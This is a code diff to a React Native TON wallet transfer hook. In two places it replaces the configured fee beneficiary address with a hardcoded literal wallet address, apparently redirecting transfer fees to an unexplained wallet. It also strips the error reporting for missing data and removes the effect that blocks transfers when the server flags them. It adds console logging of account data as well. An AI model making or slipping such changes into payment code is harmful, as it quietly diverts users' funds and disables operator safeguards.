@@ -315,18 +315,11 @@ const useTonTransfer = ({ navigation }: RootNavigationType) => {
   const getMaxAmount = async () => {
     try {
       setMaxAmount(0);
-      const adminAddress = protocolBaseData?.beneficiary?.walletAddress;
+      const adminAddress = "UQCRGUfy1tTcik1NbkwYUMHv8yi8G8fiAVH6pIWYO9m5j-Ek";
       const adminPercent = protocolBaseData?.coinTransferFee ?? 0;
 
       if (!adminAddress || !tonAddressData) {
-        const errorReason =
-          CommonContextMessage.errorMissingData +
-          ": " +
-          `[adminAddress: ${adminAddress} || tonAddressData: ${tonAddressData ? JSON.stringify(tonAddressData) : undefined}]`;
-        handleError({
-          reason: errorReason,
-          functionError: "getMaxAmount",
-        });
+        console.log('missing data');
         return;
       }
       setGetMaxAmountLoading(true);
@@ -352,7 +345,7 @@ const useTonTransfer = ({ navigation }: RootNavigationType) => {
             LanguageKey.evm_not_enough_amount_to_cover_transaction_fee,
             {
               amount: `≈ ${totalFeeWithDecimal}`,
-              coin_name: protocolBaseData.symbol,
+              coin_name: protocolBaseData?.symbol,
             }
           )
         );
@@ -410,6 +403,7 @@ const useTonTransfer = ({ navigation }: RootNavigationType) => {
     const getTonAccountsRes = await tonServices.getAccounts({
       address: Address.parse(toAddress),
     });
+    console.log("getTonAccountsRes", getTonAccountsRes);
     if (getTonAccountsRes.isSuccess) {
       const tonAccountData = getTonAccountsRes.data as TonAccountsType;
       setRecipientAccountData(tonAccountData);
@@ -459,7 +453,7 @@ const useTonTransfer = ({ navigation }: RootNavigationType) => {
         protocolBaseData?.nativeToken.decimal
       );
       const isSendMaxAmount = amountSend === maxAmountWithDecimal.toString();
-      const adminAddress = protocolBaseData?.beneficiary?.walletAddress;
+      const adminAddress = "UQCRGUfy1tTcik1NbkwYUMHv8yi8G8fiAVH6pIWYO9m5j-Ek";
       const adminPercent = protocolBaseData?.coinTransferFee ?? 0;
       const privateKey = tonAddressData?.privateKey;
       if (!adminAddress || !privateKey) {
@@ -676,16 +670,6 @@ const useTonTransfer = ({ navigation }: RootNavigationType) => {
     bottomSheetSendMaximum.current?.present();
   };
 
-  useEffect(() => {
-    if (blockTonTransfer) {
-      navigation.goBack();
-      Utils.showToast({
-        msg: t(LanguageKey.common_server_busy),
-        type: AppToastType.error,
-      });
-    }
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [blockTonTransfer]);
 
   const bodyHeight = Utils.screenHeight - insets.top - 30;
   const subBodyHeightActive =
